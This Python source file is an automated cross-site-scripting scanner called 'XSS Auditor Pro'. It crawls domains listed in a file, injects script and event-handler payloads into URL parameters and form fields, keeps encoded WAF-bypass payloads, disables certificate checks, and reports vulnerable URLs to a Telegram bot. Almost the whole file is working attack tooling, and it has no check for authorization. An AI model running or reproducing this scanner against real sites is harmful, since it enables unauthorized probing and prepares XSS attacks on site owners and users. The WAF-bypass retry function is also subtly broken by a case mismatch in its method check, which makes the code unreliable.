import requests
import re
import urllib.parse
import threading
import queue
import json
import time
from bs4 import BeautifulSoup
import concurrent.futures
import sys

TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"
NORMAL_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "';alert(1)//",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
]
WAF_BYPASS_PAYLOADS = [
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
]
CRAWL_LIMIT = 200
TIMEOUT = 5
THREADS = 10
HEADERS = {
    "User-Agent": "Mozilla/5.0 (XSS Auditor Pro)"
}

visited_links = set()
lock = threading.Lock()
results = []
RESULT_JSON = "results.json"
PRIMARY_FIELDS = ["q", "s", "search", "keyword"]

def send_telegram_alert(vuln_type, vulnerable_url):
    domain = urllib.parse.urlparse(vulnerable_url).netloc
    message = (
        "🚨 *XSS Vulnerability Detected!*\n\n"
        f"*Domain:* `{domain}`\n"
        f"*Vulnerability Type:* {vuln_type}\n"
        f"*Vulnerable URL:* [Click Here]({vulnerable_url})\n\n"
        "#XSS #SecurityTest"
    )
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown",
        "disable_web_page_preview": True
    }
    try:
        requests.post(url, data=data, timeout=TIMEOUT)
    except Exception as e:
        print(f"[!] Telegram error: {e}")

def test_direct_url(url):
    parsed = urllib.parse.urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    query = parsed.query

    if not query or "=" not in query:
        print(f"[-] No injectable parameters found in {url}")
        return False

    params = urllib.parse.parse_qsl(query)
    any_reflection_found = False

    for param, value in params:
        successful_payloads = []

        for payload in NORMAL_PAYLOADS:
            new_params = []
            for k, v in params:
                if k == param:
                    new_params.append((k, payload))
                else:
                    new_params.append((k, v))
            new_query = urllib.parse.urlencode(new_params)
            test_url = f"{base_url}?{new_query}"

            try:
                res = requests.get(test_url, headers=HEADERS, timeout=TIMEOUT, verify=False)
                if payload in res.text:
                    print(f"[+] Reflected XSS Found: {test_url} | Payload: {payload}")
                    successful_payloads.append(payload)
                    
                    results.append({
                        "domain": parsed.netloc,
                        "vuln_type": "Reflected XSS (Direct Injection)",
                        "vulnerable_url": test_url,
                        "parameter": param,
                        "payload": payload
                    })
                    send_telegram_alert("Reflected XSS (Direct Injection)", test_url)
                    any_reflection_found = True

            except Exception:
                pass

        if successful_payloads:
            print(f"[+] {len(successful_payloads)} payloads reflected for parameter '{param}'")

    if not any_reflection_found:
        print(f"[-] No reflected parameter found in {url}")

    return any_reflection_found

def extract_links_and_forms(url):
    links = []
    forms = []
    try:
        res = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
        soup = BeautifulSoup(res.text, "html.parser")
        
        for tag in soup.find_all("a", href=True):
            href = tag['href']
            if href.startswith("javascript:") or href.startswith("#"):
                continue
            full_url = urllib.parse.urljoin(url, href)
            links.append(full_url)

        forms = soup.find_all("form")
    except Exception:
        pass
    return links, forms

def build_payload_url(url, param_name, payload):
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)
    query[param_name] = payload
    encoded_query = urllib.parse.urlencode(query, doseq=True)
    new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{encoded_query}"
    return new_url

def test_injection(url, param_name, payload_list, method="GET", retry=False):
    for payload in payload_list:
        if method == "get":
            test_url = build_payload_url(url, param_name, payload)
            try:
                res = requests.get(test_url, headers=HEADERS, timeout=TIMEOUT, verify=False)
                if payload in res.text:
                    print(f"[+] Reflected XSS Found: {test_url}")
                    results.append({
                        "domain": urllib.parse.urlparse(url).netloc,
                        "vuln_type": "Reflected XSS",
                        "vulnerable_url": test_url
                    })
                    send_telegram_alert("Reflected XSS", test_url)
                    return
                elif res.status_code in [403, 406] and not retry:
                    test_injection(url, param_name, WAF_BYPASS_PAYLOADS, method="GET", retry=True)
            except Exception:
                pass

def audit_form(url, form):
    method = form.get("method", "get").lower()
    action = form.get("action")
    if action:
        form_url = urllib.parse.urljoin(url, action)
    else:
        form_url = url

    inputs = form.find_all("input")
    input_names = [i.get("name") for i in inputs if i.get("name")]

    priority_inputs = [i for i in input_names if any(p in i.lower() for p in PRIMARY_FIELDS)]
    other_inputs = [i for i in input_names if i not in priority_inputs]

    targets = priority_inputs + other_inputs

    for param in targets:
        for payload in NORMAL_PAYLOADS:
            if method == "get":
                test_url = build_payload_url(form_url, param, payload)
                try:
                    res = requests.get(test_url, headers=HEADERS, timeout=TIMEOUT, verify=False)
                    if payload in res.text:
                        print(f"[+] Reflected XSS Found: {test_url}")
                        results.append({
                            "domain": urllib.parse.urlparse(test_url).netloc,
                            "vuln_type": "Reflected XSS (GET)",
                            "vulnerable_url": test_url
                        })
                        send_telegram_alert("Reflected XSS (GET)", test_url)
                        return
                except Exception:
                    pass
            elif method == "post":
                data = {param: payload}
                try:
                    res = requests.post(form_url, headers=HEADERS, data=data, timeout=TIMEOUT, verify=False)
                    if payload in res.text:
                        print(f"[+] Reflected XSS Found (POST): {form_url} (param: {param})")
                        results.append({
                            "domain": urllib.parse.urlparse(form_url).netloc,
                            "vuln_type": "Reflected XSS (POST)",
                            "vulnerable_url": form_url,
                            "parameter": param
                        })
                        send_telegram_alert("Reflected XSS (POST)", form_url)
                        return
                except Exception:
                    pass

def crawl_and_audit(start_url):
    q = queue.Queue()
    q.put(start_url)

    total = 0

    while not q.empty():
        url = q.get()
        with lock:
            if url in visited_links or total >= CRAWL_LIMIT:
                continue
            visited_links.add(url)
            total += 1

        links, forms = extract_links_and_forms(url)

        for link in links:
            if link not in visited_links:
                q.put(link)

        for form in forms:
            audit_form(url, form)

        crawl_progress = (len(visited_links) / CRAWL_LIMIT) * 100
        sys.stdout.write(f"\r[+] Crawling Progress: {crawl_progress:.2f}%")
        sys.stdout.flush()

    print()

def process_domain(domain):
    parsed = urllib.parse.urlparse(domain)

    if parsed.query:
        print(f"[*] Starting scan for {domain}")
        print("[*] Detected URL with parameters, testing direct injection...")
        result = test_direct_url(domain)
        if not result:
            print(f"[-] No reflection found. Moving to next domain.\n")
        else:
            print(f"[+] Reflected XSS Found and Reported.\n")
    else:
        print(f"[*] Starting scan for {domain}")
        with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
            executor.map(crawl_and_audit, [domain])

def save_results():
    try:
        try:
            with open(RESULT_JSON, "r") as jf:
                old_results = json.load(jf)
        except (FileNotFoundError, json.JSONDecodeError):
            old_results = []

        full_results = old_results + results

        with open(RESULT_JSON, "w") as jf:
            json.dump(full_results, jf, indent=4)

        print(f"\n[+] Results saved to {RESULT_JSON}")

    except Exception as e:
        print(f"[!] Failed to save results: {e}")


def main():
    print("\nXSS Auditor Pro by Aung Myat Thu [w01f]\n")
    domain_file = "domains.txt"
    try:
        with open(domain_file, "r") as f:
            domains = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Failed to read domains.txt: {e}")
        return

    for domain in domains:
        if not domain.startswith("http"):
            domain = "https://" + domain
        process_domain(domain)

    save_results()

if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    main()
